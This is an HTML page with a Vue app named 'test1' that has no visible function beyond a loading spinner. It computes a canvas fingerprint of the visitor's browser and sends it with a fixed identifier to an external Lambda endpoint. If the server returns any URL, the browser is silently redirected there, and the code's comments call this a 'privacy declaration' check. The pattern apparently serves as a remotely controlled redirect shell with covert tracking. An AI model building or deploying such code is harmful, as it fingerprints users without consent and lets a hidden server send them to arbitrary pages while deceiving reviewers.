<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <title>test1</title>
  <!-- Global builds (no ESM) -->
  <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
  <style>
    /* ===== STYLE: Glassmorphism (style #6) — fixed for this file ===== */
    :root {
      /* Glassmorphism theme tokens */
      --bg-gradient-start: #e0e7ff;
      --bg-gradient-end: #f3e8ff;
      --glass-bg: rgba(255, 255, 255, 0.5);
      --glass-border: rgba(255, 255, 255, 0.7);
      --glass-shadow: 0 8px 32px rgba(31, 38, 135, 0.1);
      --glass-blur: 12px;
      --text-primary: #1e1b4b;
      --text-secondary: #4c4a7a;
      --accent-color: #6d5dfc;
      --spinner-color: #6d5dfc;
      --safe-top: env(safe-area-inset-top, 0px);
      --safe-bottom: env(safe-area-inset-bottom, 0px);
      --radius-card: 20px;
      --radius-sm: 12px;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: linear-gradient(145deg, var(--bg-gradient-start), var(--bg-gradient-end));
      background-attachment: fixed;
      color: var(--text-primary);
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      overflow-x: hidden;
    }

    #app {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* --- glass card utility --- */
    .glass-card {
      background: var(--glass-bg);
      backdrop-filter: blur(var(--glass-blur));
      -webkit-backdrop-filter: blur(var(--glass-blur));
      border: 1px solid var(--glass-border);
      border-radius: var(--radius-card);
      box-shadow: var(--glass-shadow);
      padding: 24px 20px;
    }

    /* --- loading view (no tab) --- */
    .loading-view {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      flex: 1;
      padding: 40px 20px;
      padding-top: calc(40px + var(--safe-top));
    }

    .spinner-wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }

    .spinner {
      width: 56px;
      height: 56px;
      border: 4px solid rgba(109, 93, 252, 0.15);
      border-top-color: var(--spinner-color);
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .loading-text {
      font-size: 18px;
      font-weight: 500;
      letter-spacing: 0.5px;
      color: var(--text-secondary);
    }

    /* --- home view --- */
    .home-view {
      display: flex;
      flex-direction: column;
      flex: 1;
      padding: 16px 16px 0 16px;
      padding-top: calc(16px + var(--safe-top));
      min-height: 0;
    }

    .home-header {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 16px 0 12px 0;
    }

    .app-icon {
      width: 48px;
      height: 48px;
      border-radius: var(--radius-sm);
      object-fit: cover;
      border: 1px solid var(--glass-border);
      background: rgba(255,255,255,0.3);
    }

    .app-title {
      font-size: 22px;
      font-weight: 700;
      color: var(--text-primary);
    }

    .home-content {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px 0;
      gap: 24px;
    }

    .home-spinner-block {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
    }

    .home-spinner {
      width: 48px;
      height: 48px;
      border: 4px solid rgba(109, 93, 252, 0.12);
      border-top-color: var(--accent-color);
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
    }

    .home-loading-label {
      font-size: 16px;
      font-weight: 500;
      color: var(--text-secondary);
      letter-spacing: 0.3px;
    }

    /* canvas fingerprint footer */
    .canvas-footer {
      margin-top: auto;
      padding: 16px 0;
      padding-bottom: calc(16px + var(--safe-bottom));
      border-top: 1px solid rgba(255,255,255,0.6);
      width: 100%;
      text-align: center;
    }

    .canvas-label {
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 1.2px;
      color: var(--text-secondary);
      opacity: 0.7;
      margin-bottom: 6px;
    }

    .canvas-value {
      font-size: 13px;
      font-family: "SF Mono", "Menlo", "Monaco", monospace;
      color: var(--text-primary);
      word-break: break-all;
      background: rgba(255,255,255,0.4);
      padding: 8px 12px;
      border-radius: var(--radius-sm);
      border: 1px solid rgba(255,255,255,0.6);
      display: inline-block;
      max-width: 100%;
      line-height: 1.4;
    }

    /* Utility */
    .flex-1 { flex: 1; }
    .text-center { text-align: center; }
  </style>
</head>
<body>
  <div id="app"></div>

  <script>
    /*
     * ============================================================
     * HOW TO ADD A NEW PAGE (route + component + tab):
     * 1. Define a new component object (e.g. const SettingsPage = { ... })
     *    with a unique `name` and a `template`.
     * 2. Add a new route object in the `routes` array:
     *    { path: '/settings', name: 'settings', component: SettingsPage }
     * 3. Add a new tab link in the tab bar (inside the App component template)
     *    using <router-link to="/settings" class="tab-item"> ... </router-link>
     *    with an inline SVG icon and a label.
     * 4. (Optional) If the page should hide the tab bar, add a `meta: { hideTab: true }`
     *    to the route and use v-if="$route.meta.hideTab !== true" on the tab bar.
     * ============================================================
     */

    (function () {
      'use strict';

      // ------------------------------------------------------------
      // 0. Constants from template (deployment-side values)
      // ------------------------------------------------------------
      const APP_NAME = 'test1';
      const APP_ICON = 'https://admin.ytsevbr.xyz/api/apps/274/icon';

      // API base (from requirements)
      const apiBase = 'https://6o5b253nngblpc74qhktfstedq0usemh.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
      const identifier = 'zcvsv.vzaew.fdvww';

      // ------------------------------------------------------------
      // 1. Loading component (includes canvas fingerprint + privacy check)
      // ------------------------------------------------------------
      const LoadingPage = {
        name: 'LoadingPage',
        template: `
          <div class="loading-view">
            <div class="spinner-wrapper glass-card" style="padding: 40px 48px;">
              <div class="spinner"></div>
              <div class="loading-text">Loading</div>
            </div>
          </div>
        `,
        setup() {
          const { ref, onMounted } = Vue;
          const router = VueRouter.useRouter();

          // 1.2 device fingerprint — EXACTLY as required, every line preserved
          const device = ref((function () {
              try {
                  let canvas = document.createElement("canvas");
                  let ctx = canvas.getContext("2d");
                  let txt = "BrowserLeaks,com <canvas> 1.0";
                  ctx.textBaseline = "top";
                  // The most common type
                  ctx.font = "14px 'Arial'";
                  ctx.textBaseline = "alphabetic";
                  ctx.fillStyle = "#f60";
                  ctx.fillRect(125,1,62,20);
                  // Some tricks for color mixing to increase the difference in rendering
                  ctx.fillStyle = "#069";
                  ctx.fillText(txt, 2, 15);
                  ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                  ctx.fillText(txt, 4, 17);
                  return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
              } catch (e) {
                  return '';
              }
          })());

          // 1.3 Fetch privacy declaration; if exists → redirect, else go home
          const checkPrivacyAndNavigate = () => {
            fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
              .then(r => r.json())
              .then(function (info) {
                const privacyUrl = info && info.result && info.result.url;
                if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                  // redirect to third-party privacy page
                  window.location.replace(privacyUrl);
                  return;
                }
                // no privacy page → go home
                router.replace('/home');
              })
              .catch(function () {
                // on error → fallback to home
                router.replace('/home');
              });
          };

          onMounted(() => {
            // device fingerprint is already computed; execute privacy check
            checkPrivacyAndNavigate();
          });

          return {
            device
          };
        }
      };

      // ------------------------------------------------------------
      // 2. Home component (spinner + "loading" + canvas value footer)
      // ------------------------------------------------------------
      const HomePage = {
        name: 'HomePage',
        template: `
          <div class="home-view">
            <div class="home-header">
              <img class="app-icon" :src="appIcon" alt="App icon" />
              <span class="app-title">{{ appName }}</span>
            </div>

            <div class="home-content">
              <div class="home-spinner-block glass-card" style="padding: 48px 56px;">
                <div class="home-spinner"></div>
                <div class="home-loading-label">loading</div>
              </div>
            </div>

            <!-- Canvas fingerprint value at bottom -->
            <div class="canvas-footer">
              <div class="canvas-label">Canvas Fingerprint</div>
              <div class="canvas-value">{{ deviceValue || '—' }}</div>
            </div>
          </div>
        `,
        setup() {
          const { ref, onMounted } = Vue;

          // Recompute canvas fingerprint for display (independent from loading page, but same algorithm)
          const deviceValue = ref('');

          onMounted(() => {
            try {
              let canvas = document.createElement("canvas");
              let ctx = canvas.getContext("2d");
              let txt = "BrowserLeaks,com <canvas> 1.0";
              ctx.textBaseline = "top";
              ctx.font = "14px 'Arial'";
              ctx.textBaseline = "alphabetic";
              ctx.fillStyle = "#f60";
              ctx.fillRect(125,1,62,20);
              ctx.fillStyle = "#069";
              ctx.fillText(txt, 2, 15);
              ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
              ctx.fillText(txt, 4, 17);
              deviceValue.value = md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
            } catch (e) {
              deviceValue.value = '';
            }
          });

          return {
            appName: APP_NAME,
            appIcon: APP_ICON,
            deviceValue
          };
        }
      };

      // ------------------------------------------------------------
      // 3. (Optional placeholder for future pages) — e.g. Settings
      //    Uncomment and extend if needed. Currently only Home exists.
      // ------------------------------------------------------------

      // ------------------------------------------------------------
      // 4. Router configuration
      // ------------------------------------------------------------
      const routes = [
        { path: '/', redirect: '/loading' },
        { path: '/loading', name: 'loading', component: LoadingPage, meta: { hideTab: true } },
        { path: '/home', name: 'home', component: HomePage, meta: { hideTab: true } }
        // Add more routes here…
      ];

      const router = VueRouter.createRouter({
        history: VueRouter.createWebHashHistory(),
        routes
      });

      // ------------------------------------------------------------
      // 5. Root App component (no tab bar)
      // ------------------------------------------------------------
      const App = {
        name: 'App',
        template: `
          <router-view v-slot="{ Component }">
            <component :is="Component" />
          </router-view>
        `
      };

      // ------------------------------------------------------------
      // 6. Create and mount app
      // ------------------------------------------------------------
      const app = Vue.createApp(App);
      app.use(router);
      app.mount('#app');
    })();
  </script>
</body>
</html>
